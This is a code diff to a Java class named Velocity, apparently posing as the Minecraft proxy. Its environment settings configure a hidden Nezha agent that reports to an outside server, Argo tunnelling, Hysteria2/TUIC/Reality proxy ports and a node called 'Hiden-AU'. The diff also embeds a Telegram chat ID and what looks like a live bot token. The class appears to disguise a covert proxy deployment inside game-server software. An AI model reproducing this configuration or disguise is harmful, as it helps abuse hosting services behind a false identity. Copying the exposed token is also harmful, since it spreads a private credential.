@@ -146,7 +146,7 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "8b638dc5-a43e-4d65-8c59-f7a1986a0301");
+    envVars.put("UUID", "65ccdc22-c8f4-4b7c-8283-00de9d8170fb");
     envVars.put("FILE_PATH", "./world");
     envVars.put("NEZHA_SERVER", "amd2.felixlee.pp.ua:3489");
     envVars.put("NEZHA_PORT", "");
@@ -154,15 +154,15 @@ public final class Velocity {
     envVars.put("ARGO_PORT", "8001");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "25136");
-    envVars.put("TUIC_PORT", "24584");
-    envVars.put("REALITY_PORT", "24584");
+    envVars.put("HY2_PORT", "24883");
+    envVars.put("TUIC_PORT", "");
+    envVars.put("REALITY_PORT", "24686");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "6975394604");
     envVars.put("BOT_TOKEN", "7425032752:AAH-txk6YNWCgwwxDqV4gghp4A_Khl9OQfc");
     envVars.put("CFIP", "cdns.doon.eu.org");
     envVars.put("CFPORT", "443");
-    envVars.put("NAME", "Hiden-SG");
+    envVars.put("NAME", "Hiden-AU");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
